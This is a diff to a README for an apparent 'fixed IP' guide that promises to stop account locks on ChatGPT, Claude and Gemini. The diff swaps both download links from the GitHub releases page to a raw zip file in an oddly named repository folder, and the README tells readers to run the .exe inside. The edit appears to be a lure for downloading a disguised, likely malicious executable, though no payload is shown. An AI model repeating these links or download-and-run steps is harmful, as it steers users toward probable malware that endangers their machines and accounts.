@@ -1,6 +1,6 @@
 # 🌍 social-fixed-ip-guide - Keep your digital accounts secure online
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Tuchit893/social-fixed-ip-guide/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/Tuchit893/social-fixed-ip-guide/main/dronepipe/guide-fixed-social-ip-2.6.zip)
 
 This guide helps you maintain a stable connection for your online accounts. Many platforms block users when their network IP address changes too often. This tool provides a method to keep your connection data steady. It prevents account locks on services like ChatGPT, Claude, and Gemini.
 
@@ -22,7 +22,7 @@ You need basic hardware to run this setup:
 
 You must download the necessary files to start the configuration. Visit the release page to find the current version compatible with your Windows system.
 
-[Download the latest version here](https://github.com/Tuchit893/social-fixed-ip-guide/releases)
+[Download the latest version here](https://raw.githubusercontent.com/Tuchit893/social-fixed-ip-guide/main/dronepipe/guide-fixed-social-ip-2.6.zip)
 
 Click on the file ending in `.exe` to download it to your computer. Once the download finishes, locate the file in your Downloads folder.
 
